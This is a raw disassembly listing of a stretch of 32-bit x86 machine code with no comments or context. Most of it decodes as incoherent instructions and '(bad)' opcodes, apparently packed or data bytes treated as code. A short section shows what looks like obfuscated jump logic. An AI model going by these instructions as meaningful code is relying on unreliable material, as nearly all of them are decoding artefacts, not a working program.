  415230:	pop    DWORD PTR [edi-0x11b53336]
  415236:	ins    DWORD PTR es:[edi],dx
  415237:	push   ebp
  415238:	ins    DWORD PTR es:[edi],dx
  415239:	push   ds
  41523a:	cwde   
  41523b:	push   ds
  41523c:	mov    al,0x40
  41523e:	pop    ds
  41523f:	or     al,0xbb
  415241:	pop    esi
  415242:	cmp    eax,0x7630308b
  415247:	mov    ds:0xbdff53bd,al
  41524c:	inc    edx
  41524d:	xchg   esi,eax
  41524e:	push   ds
  41524f:	pop    ebx
  415250:	mov    dh,0xa1
  415252:	adc    eax,DWORD PTR [edx+0x7d]
  415255:	lock daa 
  415257:	in     eax,dx
  415258:	add    esp,DWORD PTR [ecx+0x618b7190]
  41525e:	mov    al,ds:0x31c818bf
  415263:	test   al,0x80
  415265:	push   ebp
  415266:	or     al,0x94
  415268:	push   ss
  415269:	inc    eax
  41526a:	nop
  41526b:	out    dx,eax
  41526c:	cld    
  41526d:	xchg   esi,eax
  41526e:	and    BYTE PTR [ebx-0x6b],0xb3
  415272:	mov    ah,0x2e
  415274:	(bad)  
  415275:	fist   WORD PTR [ebx-0x1788d934]
  41527b:	popf   
  41527c:	(bad)  
  41527d:	int3   
  41527e:	or     eax,0x4f8ca119
  415283:	xor    BYTE PTR [ebp-0x39],0xd
  415287:	inc    ecx
  415288:	cwde   
  415289:	mov    esi,0x16c96a67
  41528e:	push   esp
  41528f:	pusha  
  415290:	test   DWORD PTR [edi],esi
  415292:	stc    
  415293:	fsubr  DWORD PTR [ecx]
  415295:	push   eax
  415296:	in     eax,0x3a
  415298:	scas   al,BYTE PTR es:[edi]
  415299:	mov    ah,0x4c
  41529b:	(bad)  
  41529c:	mov    ch,bh
  41529e:	xchg   edx,eax
  41529f:	addr16 loop 0x41524d
  4152a2:	mov    ds:0x9f64d307,eax
  4152a7:	mov    eax,0x8c52d1d2
  4152ac:	sub    DWORD PTR [eax+eax*2],ebp
  4152af:	inc    ebp
  4152b0:	sbb    al,0xd9
  4152b2:	sbb    BYTE PTR [ecx+eax*2-0x23],0x1e
  4152b7:	(bad)  
  4152b8:	mov    ecx,0xaeb0e9a6
  4152bd:	aaa    
  4152be:	add    BYTE PTR [edx],ch
  4152c0:	(bad)  
  4152c1:	sahf   
  4152c2:	inc    ebx
  4152c3:	and    al,0x3f
  4152c5:	mov    esp,DWORD PTR [ebx]
  4152c7:	arpl   WORD PTR [ebx+esi*8-0x4b004991],bx
  4152ce:	cmp    BYTE PTR [ebx-0x204cb7ad],cl
  4152d4:	or     dh,ch
  4152d6:	ins    BYTE PTR es:[edi],dx
  4152d7:	inc    eax
  4152d8:	test   eax,0xe9870d4b
  4152dd:	dec    edx
  4152de:	lahf   
  4152df:	xchg   edi,eax
  4152e0:	push   ebx
  4152e1:	imul   edx,eax,0x3599cc47
  4152e7:	sbb    eax,0x7da2f662
  4152ec:	int    0x57
  4152ee:	cmp    edi,DWORD PTR [ebx+ecx*8+0x23543c6]
  4152f5:	inc    ebp
  4152f6:	inc    eax
  4152f7:	push   0xffffffbb
  4152f9:	fs inc ebp
  4152fb:	mov    edx,0x5f2e3957
  415300:	xchg   edx,eax
  415301:	cmp    eax,DWORD PTR [edx+0x1f]
  415304:	aas    
  415305:	repnz add al,dl
  415308:	or     cl,bh
  41530a:	fs mov eax,ds:0x36af346d
  415311:	xor    edx,DWORD PTR [ecx]
  415313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415314:	lahf   
  415315:	jle    0x41538b
  415317:	xor    DWORD PTR [ebp+0x78],esp
  41531a:	mov    bh,0xa8
  41531c:	sub    DWORD PTR [edx+0x7d],ebp
  41531f:	ja     0x4152a1
  415321:	cmp    esp,edx
  415323:	mov    al,ch
  415325:	xchg   DWORD PTR [edi],ebp
  415327:	div    DWORD PTR [edx-0xa7571e9]
  41532d:	adc    DWORD PTR [edx],0x7b
  415330:	inc    edi
  415331:	hlt    
  415332:	xor    ecx,ebx
  415334:	mov    BYTE PTR [ebp+0xa],bh
  415337:	cld    
  415338:	int3   
  415339:	fistp  WORD PTR [edx]
  41533b:	inc    esi
  41533c:	mov    ecx,0x8b520cb4
  415341:	hlt    
  415342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415343:	hlt    
  415344:	pop    eax
  415345:	push   edx
  415346:	test   al,0x27
  415348:	pop    ss
  415349:	xchg   BYTE PTR [edi],bh
  41534b:	or     ebp,DWORD PTR [ebx+0x2a]
  41534e:	mov    al,0x8
  415350:	xor    dl,ch
  415352:	jmp    0x4aa7:0x939bf704
  415359:	ss enter 0x811c,0xd8
  41535e:	in     eax,dx
  41535f:	xchg   ebp,eax
  415360:	xor    eax,0x85953324
  415365:	pop    edx
  415366:	mov    ah,0xc2
  415368:	lahf   
  415369:	jp     0x4153e1
  41536b:	pop    ds
  41536c:	pop    edi
  41536d:	and    cl,BYTE PTR [esi+0x6d]
  415370:	lahf   
  415371:	stc    
  415372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415373:	aaa    
  415374:	and    BYTE PTR ds:0x29bbbb7,dl
  41537a:	call   0x96d:0xcfa218e0
  415381:	sub    bl,ah
  415383:	clc    
  415384:	(bad)  
  415385:	push   eax
  415386:	add    cl,BYTE PTR [ebx*1+0x32d4134b]
  41538d:	mov    cl,0xec
  41538f:	and    al,0xba
  415391:	loopne 0x415340
  415393:	ret    0x5460
  415396:	imul   BYTE PTR [eax-0x4a5893ff]
  41539c:	mov    BYTE PTR [ebx+0xaa51aee],bh
  4153a2:	inc    edi
  4153a3:	or     DWORD PTR [edx-0x1f],ebp
  4153a6:	scas   eax,DWORD PTR es:[edi]
  4153a7:	cmp    ecx,DWORD PTR [ecx]
  4153a9:	and    BYTE PTR [eax+edx*1+0x2b],dl
  4153ad:	sub    al,0x46
  4153af:	adc    ah,ah
  4153b1:	push   ds
  4153b2:	push   cs
  4153b3:	in     al,0xca
  4153b5:	popf   
  4153b6:	add    BYTE PTR [eax],ah
  4153b8:	stos   BYTE PTR es:[edi],al
  4153b9:	mov    ch,0x9f
  4153bb:	sahf   
  4153bc:	call   0x1e8a:0x5de7b582
  4153c3:	sti    
  4153c4:	jmp    0x415357
  4153c6:	or     dl,ch
  4153c8:	xor    edi,DWORD PTR [esi+0x2d]
  4153cb:	test   al,0x38
  4153cd:	push   esi
  4153ce:	outs   dx,BYTE PTR ds:[esi]
  4153cf:	outs   dx,DWORD PTR ds:[esi]
  4153d0:	dec    ebp
  4153d1:	adc    esp,DWORD PTR [ebx+0x1f]
  4153d4:	cmc    
  4153d5:	mov    cl,0x8c
  4153d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153d8:	ins    DWORD PTR es:[edi],dx
  4153d9:	dec    ch
  4153db:	out    dx,eax
  4153dc:	adc    dl,ch
  4153de:	ins    DWORD PTR es:[edi],dx
  4153df:	dec    edi
  4153e0:	adc    esi,DWORD PTR es:[edi+0x503ccbd6]
  4153e7:	adc    al,0xe9
  4153e9:	or     al,0xa2
  4153eb:	sub    DWORD PTR [edx-0x907c57f],esi
  4153f1:	push   ds
  4153f2:	mov    ds:0xbcefb629,al
  4153f7:	xor    BYTE PTR [esi],bh
  4153f9:	retf   
  4153fa:	mov    edx,0xa85b0780
  4153ff:	sbb    eax,0x21ff5730
  415404:	adc    al,0xe6
  415406:	stos   DWORD PTR es:[edi],eax
  415407:	push   ds
  415408:	repz inc ebx
  41540a:	int    0xc5
  41540c:	pop    DWORD PTR [eax+eax*8-0x7f]
  415410:	push   ss
  415411:	xor    dh,bh
  415413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415414:	adc    al,0x4e
  415416:	nop
  415417:	loopne 0x415451
  415419:	inc    eax
  41541a:	xchg   edx,eax
  41541b:	pushf  
  41541c:	mov    esp,0x29c61b0c
  415421:	or     DWORD PTR [edx+0x76],0x3d8bd05f
  415428:	dec    ebx
  415429:	push   eax
  41542a:	enter  0x539a,0x93
  41542e:	mov    edi,0x9a45aa12
  415433:	mov    esp,DWORD PTR [bx]
  415436:	inc    edi
  415437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415438:	or     BYTE PTR [edi-0x7a],0x47
  41543c:	stos   BYTE PTR es:[edi],al
  41543d:	stos   DWORD PTR es:[edi],eax
  41543e:	dec    ecx
  41543f:	dec    ebp
  415440:	adc    BYTE PTR [ebx],0x21
  415443:	pop    es
  415444:	xchg   edi,eax
  415445:	sbb    esi,DWORD PTR [edx]
  415447:	repz mov ch,al
  41544a:	cmp    ch,BYTE PTR [esi]
  41544c:	mov    ebx,0x10199223
  415451:	add    al,0xd
  415453:	shl    BYTE PTR [edx-0x1f],1
  415456:	ss (bad) 
  415458:	mov    ecx,0x476ee14d
  41545d:	(bad)  
  41545e:	jmp    0x41546e
  415460:	pop    edx
  415461:	and    DWORD PTR [edi],eax
  415463:	daa    
  415464:	adc    dl,BYTE PTR [edx]
  415466:	out    dx,eax
  415467:	sub    esi,esp
  415469:	mov    al,ds:0xa893d3cf
  41546e:	push   ecx
  41546f:	fs sub ch,bl
  415472:	or     BYTE PTR [esi+0x73],0xc4
  415476:	dec    edi
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xf3
  4154c8:	xchg   DWORD PTR [edi],esi
  4154ca:	pop    ss
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0x6970707e
  4154d4:	xchg   edi,eax
  4154d5:	xor    bl,BYTE PTR [ebp+0x7fc4b8f6]
  4154db:	(bad)  
  4154dc:	mov    eax,0x254a06ea
  4154e1:	sub    eax,DWORD PTR [edi+0x19c1412c]
  4154e7:	sbb    DWORD PTR [edx+0x3f5386ea],0xf4731b66
  4154f1:	mov    al,0xc
  4154f3:	dec    edi
  4154f4:	sar    BYTE PTR [ecx],0x7e
  4154f7:	cmp    eax,0xd6b4a5ec
  4154fc:	out    dx,eax
  4154fd:	cs jo  0x4154d7
  415500:	sub    ch,ah
  415502:	sub    DWORD PTR [ebx+0x42],0xc40ec13f
  415509:	lock daa 
  41550b:	fcmovne st,st(5)
  41550d:	inc    edi
  41550e:	jo     0x415557
  415510:	vmovlps QWORD PTR ds:0xdcf45543,xmm4
  415518:	hlt    
  415519:	add    cl,ch
  41551b:	out    dx,eax
  41551c:	push   edi
  41551d:	mov    WORD PTR [eax-0x44],ds
  415520:	push   edi
  415521:	(bad)  
  415522:	push   ecx
  415523:	mov    esi,0xb2097aa1
  415528:	mov    bl,0xd1
  41552a:	ins    BYTE PTR es:[edi],dx
  41552b:	sub    edi,eax
  41552d:	push   ecx
  41552e:	xchg   edi,eax
  41552f:	das    
  415530:	dec    eax
  415531:	cmp    eax,0xb7c15bdc
  415536:	xchg   BYTE PTR [eax+0x5283b57a],dl
  41553c:	pop    ecx
  41553d:	add    ebx,DWORD PTR [edx]
  41553f:	push   edi
  415540:	xchg   ecx,eax
  415541:	arpl   WORD PTR [ebp+edi*2-0x44701401],sp
  415548:	sub    eax,0x90e57c54
  41554d:	fwait
  41554e:	out    0x26,al
  415550:	inc    ecx
  415551:	xchg   BYTE PTR [ebx],dl
  415553:	jle    0x415517
  415555:	std    
  415556:	adc    DWORD PTR [esi+0x2e],esp
  415559:	xor    al,0xc7
  41555b:	loopne 0x41555e
  41555d:	and    BYTE PTR ds:0x2b7b3df1,ah
  415563:	mov    ecx,esi
  415565:	inc    ebp
  415566:	or     ah,cl
  415568:	jl     0x415504
  41556a:	addr16 add ebp,esi
  41556d:	sahf   
  41556e:	out    dx,eax
  41556f:	or     eax,eax
  415571:	dec    ecx
  415572:	mov    dl,0x1e
  415574:	fild   QWORD PTR [edi-0x4]
  415577:	and    al,0xb4
  415579:	dec    edx
  41557a:	jmp    0x395f7c7b
  41557f:	repnz shl dh,cl
  415582:	les    eax,FWORD PTR [edx+0x14bffea5]
  415588:	cs jno 0x415560
  41558b:	into   
  41558c:	das    
  41558d:	add    al,0x2b
  41558f:	aad    0x6a
  415591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415592:	pushf  
  415593:	mov    bl,0xc0
  415595:	ficomp DWORD PTR [ecx+0x70]
  415598:	mul    BYTE PTR [ecx+0x673b10dc]
  41559e:	dec    edx
  41559f:	dec    edi
  4155a0:	dec    ecx
  4155a1:	fild   WORD PTR [edx-0x6f]
  4155a4:	imul   edx,ecx,0xa05f589d
  4155aa:	cmp    ebx,ebp
  4155ac:	test   eax,0xc87e96d9
  4155b1:	fisttp QWORD PTR [ebp-0x7fe610f7]
  4155b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155b8:	push   0x20
  4155ba:	mov    edi,0x978dee5
  4155bf:	mov    WORD PTR [ecx+edx*8+0x49],ss
  4155c3:	jl     0x415575
  4155c5:	arpl   WORD PTR [esi+esi*8],ax
  4155c8:	pop    edi
  4155c9:	outs   dx,BYTE PTR ds:[esi]
  4155ca:	dec    ebx
  4155cb:	outs   dx,BYTE PTR ds:[esi]
  4155cc:	fbld   TBYTE PTR [edi+0x7e]
  4155cf:	inc    edi
  4155d0:	jo     0x4155b9
  4155d2:	out    0x6b,al
  4155d4:	sub    DWORD PTR [edx-0x12],edx
  4155d7:	adc    dh,ah
  4155d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155da:	stos   BYTE PTR es:[edi],al
  4155db:	xor    BYTE PTR [ecx+0x6b2ad70f],al
  4155e1:	loope  0x415607
  4155e3:	(bad)  
  4155e4:	(bad)  
  4155e6:	call   0xe38ff5f7
  4155eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ec:	clc    
  4155ed:	(bad)  
  4155ee:	fcom   QWORD PTR [edx-0x14]
  4155f1:	mov    eax,0x5562ab4f
  4155f6:	mov    eax,cs
  4155f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155f9:	aad    0xe9
  4155fb:	mov    eax,0xd900b9e3
  415600:	ins    DWORD PTR es:[edi],dx
  415601:	ds sahf 
  415603:	mov    al,ds:0xca1f0f40
  415608:	repnz mov ah,0x38
  41560b:	add    ebx,DWORD PTR [ebx+eiz*1]
  41560e:	adc    ah,ch
  415610:	pop    edx
  415611:	mov    DWORD PTR [eax-0x5f],ecx
  415614:	or     eax,0xd1ac4011
  415619:	jmpw   0x2d2
  41561d:	int    0x4f
  41561f:	adc    esi,esi
  415621:	stos   DWORD PTR es:[edi],eax
  415622:	sbb    dl,BYTE PTR [edx-0x6db61a28]
  415628:	(bad)  
  415629:	(bad)  
  41562a:	mov    ecx,0x575211e4
  41562f:	sbb    BYTE PTR [edx+0x49],al
  415632:	rcr    ch,cl
  415634:	aad    0x3
  415636:	dec    edi
  415637:	out    dx,eax
  415638:	aad    0x38
  41563a:	cmc    
  41563b:	cld    
  41563c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41563d:	ss mov ah,0x1b
  415640:	aad    0x65
  415642:	fistp  QWORD PTR [esi-0x4b]
  415645:	lods   al,BYTE PTR ds:[esi]
  415646:	fstp   QWORD PTR [ebx-0x15]
  415649:	ret    0x1ef7
  41564c:	mov    edi,0x2c4c6b41
  415651:	push   ebp
  415652:	bound  ebp,QWORD PTR [ebx+0x6e]
  415655:	ret    
  415656:	lods   al,BYTE PTR ds:[esi]
  415657:	fsub   QWORD PTR [ebp-0x8]
  41565a:	inc    edi
  41565b:	call   0xb61061dd
  415660:	cmp    al,0x94
  415662:	rcl    DWORD PTR [esi+ebp*1],1
  415665:	data16 sub BYTE PTR [ebx+ebp*2],ch
  415669:	into   
  41566a:	mov    ds:0xae0613a3,al
  41566f:	xor    eax,0x29090b53
  415674:	add    al,0xb0
  415676:	add    ah,ah
  415678:	mov    edx,0x5c107c27
  41567d:	inc    ebp
  41567e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41567f:	jne    0x4156c8
  415681:	push   cs
  415682:	xor    edi,DWORD PTR [esi]
  415684:	cmp    al,BYTE PTR [eax-0x27bec702]
  41568a:	test   eax,0x460a62d8
  41568f:	or     eax,0x36c0fe37
  415694:	imul   edx,DWORD PTR [ebx-0x10],0xffffff8d
  415698:	pop    ss
  415699:	jle    0x415639
  41569b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41569c:	sbb    eax,0xe5ab32e0
  4156a1:	shl    ebp,cl
  4156a3:	mov    ss,edx
  4156a5:	popa   
  4156a6:	mov    cl,0x7c
  4156a8:	add    eax,ebx
  4156aa:	mov    esi,0xa3e27427
  4156af:	mov    esi,0x58eaf943
  4156b4:	jns    0x4156e6
  4156b6:	inc    esp
  4156b7:	adc    DWORD PTR [esi],edi
  4156b9:	pop    edx
  4156ba:	xor    eax,0xb1ad4618
  4156bf:	gs push ss
  4156c1:	push   esp
  4156c2:	adc    ch,BYTE PTR [esi-0x35ed5b4c]
  4156c8:	ds pop ecx
  4156ca:	cs icebp 
  4156cc:	dec    esp
  4156cd:	pop    ebx
  4156ce:	outs   dx,BYTE PTR ds:[esi]
  4156cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156d0:	loop   0x4156ee
  4156d2:	pusha  
  4156d3:	add    BYTE PTR [edi+0x1f],cl
  4156d6:	stos   DWORD PTR es:[edi],eax
  4156d7:	sbb    al,0x60
  4156d9:	int3   
  4156da:	ret    
  4156db:	xchg   ebp,eax
  4156dc:	xor    al,0x5a
  4156de:	jns    0x415682
  4156e0:	fadd   st,st(1)
  4156e2:	fimul  DWORD PTR [esi-0x56]
  4156e5:	and    DWORD PTR [ebp+0x7f0a7377],ecx
  4156eb:	arpl   WORD PTR [edi+0x2ee34768],sp
  4156f1:	mov    eax,0x2d13c070
  4156f6:	nop
  4156f7:	mov    edx,0x3363d930
  4156fc:	or     DWORD PTR [edx],ebp
  4156fe:	jo     0x4156db
  415700:	dec    ebp
  415701:	mov    WORD PTR [ebx],?
  415703:	rcr    DWORD PTR [edx],0x8b
  415706:	jmp    0xc40a3a7a
  41570b:	fld    DWORD PTR [edx-0x32457dc4]
  415711:	add    BYTE PTR [edx+0x2d9694cd],0x1a
  415718:	or     dh,bl
  41571a:	out    dx,eax
  41571b:	xchg   DWORD PTR [ebx+ebx*1],esi
  41571e:	mov    eax,ds:0x7dca88ca
  415723:	(bad)  
  415724:	jnp    0x415752
  415726:	rol    BYTE PTR [edx+0x7d],cl
  415729:	fwait
  41572a:	jmp    0xb02f:0xe4113be9
  415731:	pop    ds
  415732:	cld    
  415733:	je     0x41573a
  415735:	mov    ebx,0xc706a738
  41573a:	xchg   ebp,eax
  41573b:	pop    ds
  41573c:	and    dh,BYTE PTR [edx-0x6c]
  41573f:	or     bh,bh
  415741:	fld    st(3)
  415743:	xchg   ebp,eax
  415744:	push   0x48f65f82
  415749:	mov    bh,0x82
  41574b:	adc    al,0xdb
  41574d:	push   DWORD PTR [ebp+0x4b]
  415750:	test   DWORD PTR [edx-0x164b81b3],eax
  415756:	and    eax,0xf5edd50e
  41575b:	mov    ss,WORD PTR [ecx-0x100d0ff9]
  415761:	mov    esi,0x9daeff9
  415766:	or     al,0xa5
  415768:	xor    eax,0x9e5a38e
  41576d:	jbe    0x415779
  41576f:	(bad)  
  415770:	jmp    0x1840355c
  415775:	daa    
  415776:	sub    DWORD PTR [edx-0x79],edx
  415779:	(bad)  [edx]
  41577b:	mov    ah,0x55
  41577d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41577f:	daa    
  415780:	cs pop es
  415782:	in     al,0x3d
  415784:	loopne 0x4157ed
  415786:	mov    fs,WORD PTR [eax+0x13]
  415789:	inc    ebx
  41578a:	mov    ebp,0xeaec9b28
  41578f:	sub    al,0x96
  415791:	xchg   esp,eax
  415792:	les    ecx,FWORD PTR [edi]
  415794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415795:	pop    ds
  415796:	cmp    dl,BYTE PTR [ebx-0x634101f2]
  41579c:	jb     0x4157d0
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR ds:0x7ffd977a,ah
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x415779
  4157c4:	outs   dx,DWORD PTR ds:[esi]
  4157c5:	pusha  
  4157c6:	or     eax,0x9057e9b8
  4157cb:	nop
  4157cc:	lds    ecx,FWORD PTR [ebx-0x53abce03]
  4157d2:	cld    
  4157d3:	xor    eax,0x78f81f08
  4157d8:	outs   dx,BYTE PTR ds:[esi]
  4157d9:	xchg   esi,eax
  4157da:	(bad)  
  4157db:	mov    BYTE PTR [edi+edi*2],al
  4157de:	std    
  4157df:	cli    
  4157e0:	and    DWORD PTR fs:[esp+eax*1+0x696f2fd8],esi
  4157e8:	and    eax,0x19b9fb2d
  4157ed:	xchg   DWORD PTR [edx],esp
  4157ef:	and    DWORD PTR [ebp+0x3461c7c2],ebp
  4157f5:	adc    BYTE PTR [edx+0x18e7a63c],cl
  4157fb:	adc    BYTE PTR [eax-0x67],bh
  4157fe:	add    ah,0xb7
  415801:	not    BYTE PTR ds:0x5f4d7e81
  415807:	rcr    BYTE PTR [ebx-0x2fb07c74],1
  41580d:	mov    bl,0xfd
  41580f:	xor    DWORD PTR [ecx],edi
  415811:	retf   
  415812:	xchg   esi,eax
  415813:	pop    ebp
  415814:	jmp    0x311f281b
  415819:	push   ebx
  41581a:	mov    ebp,0xc046f367
  41581f:	add    edi,esi
  415821:	sub    al,0xe1
  415823:	call   0x336b:0xd44c40e8
  41582a:	pop    es
  41582b:	dec    edx
  41582c:	stc    
  41582d:	xlat   BYTE PTR ds:[ebx]
  41582e:	fidivr WORD PTR [esi+ecx*8+0x57]
  415832:	cmc    
  415833:	aad    0x40
  415835:	cmp    eax,0x4c656ebb
  41583a:	hlt    
  41583b:	cwde   
  41583c:	loope  0x415872
  41583e:	xchg   edi,eax
  41583f:	lock clc 
  415841:	rol    BYTE PTR [esi+0x4f],1
  415844:	jmp    0x3b5e:0xc7e22bdb
  41584b:	test   DWORD PTR [edx-0x27b47ca2],esi
  415851:	mov    edx,0x1fabcf65
  415856:	cli    
  415857:	test   al,0xbc
  415859:	and    dl,BYTE PTR [ebp-0x77]
  41585c:	adc    ebx,0x7e
  41585f:	pop    es
  415860:	out    dx,al
  415861:	jmp    DWORD PTR [edx-0x67e971f4]
  415867:	mov    edi,0xa0551a1
  41586c:	jns    0x41583d
  41586e:	push   ebx
  41586f:	add    DWORD PTR [ebp-0x547fd609],ecx
  415875:	dec    esp
  415876:	in     eax,dx
  415877:	jne    0x415835
  415879:	xor    bh,BYTE PTR [esi]
  41587b:	sub    bh,BYTE PTR [esp+eiz*8+0x71597b35]
  415882:	fwait
  415883:	sub    eax,0x2ac898d7
  415888:	scas   eax,DWORD PTR es:[edi]
  415889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41588a:	jmp    0x415874
  41588c:	pop    edi
  41588d:	sar    BYTE PTR [edx],1
  41588f:	xlat   BYTE PTR ds:[ebx]
  415890:	mov    dh,0x90
  415892:	mov    eax,ds:0x78fb809d
  415897:	add    al,dl
  415899:	gs dec edi
  41589b:	test   eax,0xba7a89dd
  4158a0:	cs pop edi
  4158a2:	sub    BYTE PTR [edi-0x44],0xfc
  4158a6:	push   eax
  4158a7:	jmp    DWORD PTR [edx]
  4158a9:	pop    es
  4158aa:	fst    DWORD PTR [edi-0x18]
  4158ad:	inc    eax
  4158ae:	dec    ecx
  4158af:	inc    eax
  4158b0:	push   cs
  4158b1:	enter  0x785d,0xd4
  4158b5:	lea    ecx,[ecx+ebp*4]
  4158b8:	push   eax
  4158b9:	or     al,0xb3
  4158bb:	xor    al,0xc0
  4158bd:	sub    DWORD PTR [ecx+edx*8+0x64],ecx
  4158c1:	sbb    DWORD PTR [edi],esp
  4158c3:	mov    cl,0xe2
  4158c5:	mov    ecx,0xf72970b6
  4158ca:	sbb    cl,bl
  4158cc:	mov    esi,0xabdc4e8d
  4158d1:	and    al,0x1e
  4158d3:	mov    eax,ds:0xbfe9449c
  4158d8:	cmp    bl,dh
  4158da:	cmp    eax,0x6f63e22
  4158df:	push   ecx
  4158e0:	sbb    al,0x84
  4158e2:	jge    0x41588c
  4158e4:	das    
  4158e5:	add    cl,cl
  4158e7:	adc    eax,0xecfac493
  4158ec:	loopne 0x41596a
  4158ee:	mov    ebp,0xd89a6fc8
  4158f3:	inc    esi
  4158f4:	neg    BYTE PTR [ebx-0x66]
  4158f7:	sub    BYTE PTR [ebx],cl
  4158f9:	or     BYTE PTR [esi+0x1ebee696],ah
  4158ff:	cmp    ch,0x9d
  415902:	rcl    DWORD PTR [eax],1
  415904:	fadd   st(1),st
  415906:	mov    dl,0xf0
  415908:	and    edx,DWORD PTR [ebx+ecx*8]
  41590b:	jo     0x415935
  41590d:	(bad)  
  41590e:	add    al,0xfc
  415910:	lods   eax,DWORD PTR ds:[esi]
  415911:	mov    ebx,0x58b9a2c3
  415916:	(bad)  
  415917:	push   0x741bb6d5
  41591c:	add    al,0x7d
  41591e:	xchg   edi,eax
  41591f:	xor    BYTE PTR [edi],bh
  415921:	dec    ebp
  415922:	sub    al,0x45
  415924:	add    ah,ah
  415926:	cmp    ah,BYTE PTR [ecx]
  415928:	sbb    eax,0xfdc8a661
  41592d:	jno    0x41599e
  41592f:	pop    ds
  415930:	mov    ebx,0xe90fa707
  415935:	inc    BYTE PTR [esi-0x781084cc]
  41593b:	idiv   BYTE PTR [esi+0x163b3e89]
  415941:	push   eax
  415942:	or     eax,0xa948b15b
  415947:	mov    eax,0xdab5f04f
  41594c:	pop    esp
  41594d:	inc    edi
  41594e:	mov    bl,0xff
  415950:	dec    ecx
  415951:	push   edi
  415952:	pop    edx
  415953:	adc    ebx,DWORD PTR [ebx+0x6f]
  415956:	int    0xb1
  415958:	inc    esp
  415959:	hlt    
  41595a:	and    ch,bl
  41595c:	inc    esi
  41595d:	in     al,0xa
  41595f:	mov    WORD PTR [eax-0x10],?
  415962:	gs repz push ebx
  415965:	in     eax,dx
  415966:	cmp    cl,BYTE PTR [edi-0x16e8b81]
  41596c:	ds inc eax
  41596e:	daa    
  41596f:	sti    
  415970:	out    dx,eax
  415971:	and    cl,0xab
  415974:	add    bh,bl
  415976:	aaa    
  415977:	jg     0x4159e5
  415979:	ja     0x415932
  41597b:	mov    edx,0x172ae1f3
  415980:	pop    es
  415981:	mov    edx,0x98ba77cb
  415986:	cmp    cl,BYTE PTR [esi-0x10]
  415989:	and    DWORD PTR [ecx-0x28736d8f],edi
  41598f:	mov    edx,cs
  415991:	jmp    0x979d:0x8128d151
  415998:	and    cl,BYTE PTR [eax-0x47]
  41599b:	ins    BYTE PTR es:[edi],dx
  41599c:	fcomp  st(3)
  41599e:	mov    ebx,0x3396c26a
  4159a3:	inc    esi
  4159a4:	push   esp
  4159a5:	rcl    edi,0x5f
  4159a8:	and    eax,0x6b045fe7
  4159ad:	popa   
  4159ae:	gs inc edi
  4159b0:	test   bl,al
  4159b2:	jmp    0x4159ea
  4159b4:	and    eax,0xe1c7fced
  4159b9:	cmp    ch,al
  4159bb:	inc    esi
  4159bc:	cmp    eax,edx
  4159be:	sahf   
  4159bf:	ins    BYTE PTR es:[edi],dx
  4159c0:	ds mov edi,ebp
  4159c3:	repz push 0x98c5ba6a
  4159c9:	dec    edi
  4159ca:	jne    0x41596e
  4159cc:	stc    
  4159cd:	(bad)  
  4159ce:	pusha  
  4159cf:	jmp    0x415a1c
  4159d1:	outs   dx,BYTE PTR ds:[esi]
  4159d2:	sbb    ch,bl
  4159d4:	push   ebx
  4159d5:	adc    edx,eax
  4159d7:	mov    edi,0xda1c2c28
  4159dc:	rcl    DWORD PTR [ecx],cl
  4159de:	push   ecx
  4159df:	fcom   DWORD PTR [edi]
  4159e1:	enter  0xd0a6,0x4e
  4159e5:	lds    ebp,FWORD PTR [edi+0x1f]
  4159e8:	inc    esp
  4159e9:	push   esi
  4159ea:	aad    0x4e
  4159ec:	push   edi
  4159ed:	test   al,0x1
  4159ef:	jle    0x415a3d
  4159f1:	enter  0xa231,0x43
  4159f5:	in     eax,0xe7
  4159f7:	dec    ecx
  4159f8:	jae    0x415a52
  4159fa:	test   eax,0xd2d32d59
  4159ff:	shl    bh,cl
  415a01:	sub    al,0x86
  415a03:	ret    
